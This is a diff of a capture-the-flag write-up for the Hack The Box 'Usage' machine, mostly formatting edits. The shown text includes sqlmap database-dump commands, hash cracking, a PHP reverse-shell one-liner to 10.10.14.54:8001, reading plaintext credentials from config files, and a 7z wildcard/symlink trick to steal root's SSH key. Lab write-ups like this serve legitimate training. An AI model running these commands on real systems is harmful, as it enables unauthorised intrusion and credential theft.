@@ -56,7 +56,7 @@ I try Laravel default credentials for the admin page with no luck. However, regi
 
 At this point I circle back to my running searches. Nmap didn't return anything new, but the dirb search on admin.usage gave us /uploads, with a /images subdirectory as well as /vendor. Unfortunately I get a 403 when I try to access either of these. 
 
-XSRF seems unlikely because there are tokens in place. I try some XSS checks as well, but none of the forms reflect any outputs, so that seems to be a no-go as well. I finally get something interesting while I'm checking for SQL injection possibilities (from this list: https://book.hacktricks.xyz/pentesting-web/sql-injection)- using the ' character on the password reset page returns "500 | SERVER ERROR", which indicates it might be injectable.
+XSRF seems unlikely because there are tokens in place. I try some XSS checks as well, but none of the forms reflect any outputs, so that seems to be a no-go as well. I finally get something interesting while I'm checking for SQL injection possibilities (from this list: https://book.hacktricks.xyz/pentesting-web/sql-injection) using the ' character on the password reset page returns "500 SERVER ERROR", which indicates it might be injectable.
 
 Firing up Burpsuite, I sent the request to the repeater, and spent some time looking through the response without gaining any additional insight. After multiple attempts, I finally got this command put together: 
 
@@ -73,17 +73,21 @@ Which breaks down into the following:
 --dbs: enumerate databases
 
 And got 3 databases:
+
 ![nmap results](/assets/images/Usage/sqlmap%20results.png)
+
 ![nmap results](/assets/images/Usage/sqlmap%20db%20type.png)
 
 I then ran the following to get the tables and dump the info of admin_users, adding in the DB type to make it run a little faster. 
 
 `sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog --tables`
+
 `sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog -T admin_users --dump`
 
 which yielded a nice hash for admin.
 
 ![nmap results](/assets/images/Usage/slqmap%20tables.png)
+
 ![nmap results](/assets/images/Usage/sqlmap%20hash.png)
 
 I then used https://hashes.com/en/tools/hash_identifier to identify the hash as bcrypt, and dropped it into a text file with vim. Hashcat gets put into work next and quickly yields admin:whatever1. Good ol' rockyou!
@@ -111,6 +115,7 @@ Which seemed to only be able to execute php commands, and I was not able to navi
 (grab listener address)
 
 `nc -nvlp 8001`
+
 `php -r '$sock=fsockopen("10.10.14.54",8001);exec("sh<&3>&3 2>&3");'`
 
 and I finally catch a shell! We can even get the user flag from here.
@@ -118,11 +123,13 @@ and I finally catch a shell! We can even get the user flag from here.
 ![nmap results](/assets/images/Usage/reverse%20shell.png)
 
 `cd ~ `
+
 `cat user.txt`
 
 The box has python so we can upgrade our shell
 
 `python3 --version`
+
 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
 
 This was my least favorite part. I spent a decent amount of time looking around the box, trying to find something useful. I can see another user, "xander", but can't access their directory. I found plaintext database credentials in /var/www/html/project_admin/.env
@@ -132,6 +139,7 @@ This was my least favorite part. I spent a decent amount of time looking around 
 But this just gives access to the mysql db I was in earlier, and the password hasn't been reused for xander, root, or admin. My search was primarily through the /var/www/html, hoping to find some type of password reuse. It wasn't until (much later) that I returned to the home directory and looked for hidden files that I finally hit paydirt. It appears there is a monitoring utility that needs some plaintext passwords to run.
 
 `ls -al`
+
 `cat .monitrc`
 
 ![nmap results](/assets/images/Usage/monitrc%20pass.png)
@@ -151,6 +159,7 @@ And now I can start down my privilege escalation checklist. Almost immediately I
 Given that the name of the box is "Usage", I'm gonna prioritize this binary. Diving right in, I see that it givecs three options - project backup, backup MySQL data, reset admin password.
 
 `cd /usr/bin`
+
 `sudo usage_management`
 
 
@@ -186,8 +195,11 @@ From what I understand, if you have write permissions to the folder 7z targets (
 Now, I could grab root.txt directly, but I would rather go full escalation and grab the ssh key instead. 
 
 `cd /var/www/html`
+
 `touch @id_rsa`
+
 `ln -s /root/.ssh/id_rsa id_rsa`
+
 `sudo /usr/bin/usage_management`
 
 ![nmap results](/assets/images/Usage/ssh%20key.png)
@@ -195,6 +207,7 @@ Now, I could grab root.txt directly, but I would rather go full escalation and g
 Bingo! I just copy into a .pem file and format correctly, then change the permissions. 
 
 `chmod 600 sshkey.pem`
+
 `ssh -i sshkey.pem root@10.10.11.18`
 
 and we have root!
